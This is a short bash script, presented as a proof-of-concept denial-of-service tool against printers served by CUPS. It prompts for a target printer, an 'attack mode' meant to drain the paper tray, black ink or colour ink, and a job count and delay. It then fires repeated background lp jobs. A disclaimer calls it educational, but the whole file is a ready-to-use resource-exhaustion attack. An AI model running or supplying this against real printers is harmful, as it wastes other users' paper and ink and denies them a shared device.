#!/bin/bash

#TODO: Add validations.

echo "You are about to run a script that can cause significant inconvenience and losses to you and other users on your network devices, for which only you will can held responsible! The script is an educational exercise and is not meant for actual DOS attacks. The author of this script is not responsible for any losses you or others incur due to the fact that you ran this script. The tool is to fire a Denial of Service attack against network devices that print via CUPS. If you don't intend to run this, please exit the script by closing the terminal window or by pressing ^C (i.e. control and C). Thank you."
echo

echo "This script is a proof of concept and has many improvements planned."
echo

echo "Available Printers,"
echo
lpstat -p -d

echo 

read -p "Enter the name of the printer as setup in CUPS [MFCJ425W]: " printer
printer="${printer:=MFCJ425W}"

printf "Supported modes:\n0: EMPTY Paper Tray.\n1. EMPTY BLACK INK.\n2. EMPTY COLOR INK.\n"

read -p "Enter the attack mode number [0]: " mode
mode="${mode:=0}"

case $mode in
0)
    file=`dirname ${0}`/empty.txt
    ;;
1)
    file=`dirname ${0}`/black.png
    ;;
2)
    file=`dirname ${0}`/rainbow.png
    ;;
*)
    echo "Unsupported mode ${mode}."
    exit 1;
    ;;
esac

echo "File to be printed: ${file}"

read -p "Enter the number of prints to fire [1]: " count
count="${count:=1}"

read -p "Enter the sleep duration in seconds between prints [0]: " sleep
sleep="${sleep:=0}"

i=0

while [ $i -lt ${count} ]
do
    echo "Printing $i"
    lp -d ${printer} -o fit-to-page ${file} &
    i=$[$i+1]
    sleep ${sleep}
done;

#   lp -d ${printer} -o fit-to-page empty.txt &
#   lp -d ${printer} -o fit-to-page black.png &
#   lp -d ${printer} -o fit-to-page rainbow.png &
